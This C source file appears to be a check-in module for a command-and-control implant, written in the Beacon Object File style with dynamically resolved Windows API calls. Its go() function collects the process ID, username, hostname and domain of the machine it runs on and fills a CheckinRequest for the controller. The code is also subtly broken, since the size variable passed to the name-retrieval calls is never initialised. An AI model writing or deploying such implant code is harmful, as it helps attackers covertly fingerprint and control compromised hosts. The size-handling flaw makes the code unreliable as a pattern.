#define SECURITY_WIN32

#include <windows.h>
#include <lm.h>
#include <security.h>
#include "../headers/celebi.h"

WINBASEAPI DWORD KERNEL32$GetCurrentProcessId();
WINBASEAPI BOOL KERNEL32$GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI BOOLEAN WINAPI SECUR32$GetUserNameExA(int NameFormat, LPSTR lpNameBuffer, PULONG nSize);
WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetWkstaGetInfo(LMSTR, DWORD, LPBYTE*);
WINBASEAPI NET_API_STATUS WINAPI NETAPI32$NetApiBufferFree(LPVOID);

void go(CheckinRequest *req) {
	DWORD len;
	
	req->pid = KERNEL32$GetCurrentProcessId();
	
	char *username = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (SECUR32$GetUserNameExA(NameSamCompatible, username, &len) == TRUE) {
		req->username = username;
	} else {
		KERNEL32$VirtualFree(username, 0, MEM_RELEASE);
	}
	
	char *hostname = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (KERNEL32$GetComputerNameA(hostname, &len) == TRUE) {
		req->hostname = hostname;
	} else {
		KERNEL32$VirtualFree(hostname, 0, MEM_RELEASE);
	}
	
	LPWKSTA_INFO_100 workstationInfo = { 0 };
	NET_API_STATUS status = NETAPI32$NetWkstaGetInfo(NULL, 100, (LPBYTE *) &workstationInfo);
	if (status == NERR_Success) {
		req->domain = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < 256; i++) {
			req->domain[i] = workstationInfo->wki100_langroup[i];
			if (req->domain[i] == 0) {
				break;
			}
		}
	}
	NETAPI32$NetApiBufferFree(workstationInfo);
}
